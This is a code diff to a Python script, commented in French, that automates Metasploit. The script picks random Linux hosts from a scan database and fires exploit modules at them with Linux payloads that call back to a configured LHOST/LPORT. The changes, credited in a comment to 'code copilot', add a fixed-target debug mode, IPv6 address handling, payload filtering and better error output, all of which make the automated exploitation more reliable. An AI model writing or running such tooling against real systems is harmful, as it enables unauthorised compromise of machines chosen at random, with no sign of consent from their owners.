@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
 # corrige par code copilot
+import ipaddress
 import os
 import html
 import psutil
@@ -18,6 +19,7 @@ PG_DBNAME = os.getenv("PG_DBNAME", "msf")
 PG_HOST = "postgres"
 
 MODE_RUN = 1
+DEBUG_MODE = int(os.getenv("DEBUG_MODE", "0"))
 
 LHOST = os.getenv("LHOST", "")
 LPORT = int(os.getenv("LPORT", "4444"))
@@ -88,12 +90,28 @@ def is_postgres_ready(ip):
         print(f"[ERREUR] Vérification PostgreSQL échouée : {e}")
         return False
 
+# Récupérer l'hôte de debug depuis host_debug (VM Rapid7 de test)
+def get_debug_host():
+    try:
+        with psycopg2.connect(dbname=PG_DBNAME, user=PG_USER, password=PG_PASSWORD, host=PG_HOST) as conn:
+            with conn.cursor() as cur:
+                cur.execute("SELECT id, address FROM host_debug LIMIT 1;")
+                return cur.fetchone() or (None, None)
+    except psycopg2.Error as e:
+        print(f"[ERREUR] Problème lors de la récupération de l'hôte debug : {e}")
+        return None, None
+
+
 # Récupérer un hôte aléatoire depuis la base de données
 def get_random_host(type):
     try:
         with psycopg2.connect(dbname=PG_DBNAME, user=PG_USER, password=PG_PASSWORD, host=PG_HOST) as conn:
             with conn.cursor() as cur:
-                cur.execute("SELECT id, address FROM hosts TABLESAMPLE SYSTEM(0.1) WHERE os_name = %s LIMIT 1;", (type,))
+                cur.execute(
+                    "SELECT id, address FROM hosts TABLESAMPLE SYSTEM(0.1) "
+                    "WHERE os_name = %s AND host(address::inet) NOT LIKE 'fe80:%' LIMIT 1;",
+                    (type,)
+                )
                 return cur.fetchone() or (None, None)
     except psycopg2.Error as e:
         print(f"[ERREUR] Problème lors de la récupération d'un hôte : {e}")
@@ -168,7 +186,14 @@ def main():
 
      console_id = client.consoles.console().cid
      console = client.consoles.console(console_id)
-     host_id, host = get_random_host('Linux')
+     if DEBUG_MODE:
+         host_id, host = get_debug_host()
+         if not host_id:
+             print("[DEBUG] Aucun hôte dans host_debug. Créer la table et insérer l'IP cible.")
+             return
+         print(f"[DEBUG] Mode debug actif — cible fixe : {host}")
+     else:
+         host_id, host = get_random_host('Linux')
      if not host:
          print("[INFO] Aucun hôte disponible.")
          return
@@ -203,7 +228,12 @@ def main():
           for index1 in range(0, len(missing)):
             match missing[index1]:
                case "RHOSTS":
-                    exploit[missing[index1]] = host
+                    try:
+                        addr = ipaddress.ip_address(str(host).split("/")[0])
+                        rhosts_val = f"[{host}]" if addr.version == 6 else str(host)
+                    except ValueError:
+                        rhosts_val = str(host)
+                    exploit[missing[index1]] = rhosts_val
                case "TARGET_PATH":
                     exploit[missing[index1]] = "/"
                case "SESSION":
@@ -222,6 +252,7 @@ def main():
 
 #        print (exploit.runoptions)
 #        print (f" payload {payload}")
+        payload = [p for p in payload if p.startswith('linux/')]
         if (len (payload) > 0):
           if ( MODE_RUN == 1 ):
             for index1 in range(0, len(payload)):
@@ -229,8 +260,8 @@ def main():
               try:
                   console.run_module_with_output(exploit, payload[index1])
                   print (": Ok")
-              except:
-                  print (": A controler")
+              except Exception as e:
+                  print (f": {type(e).__name__}: {e}")
                   continue
               while console.is_busy():
                    print("+",end="")
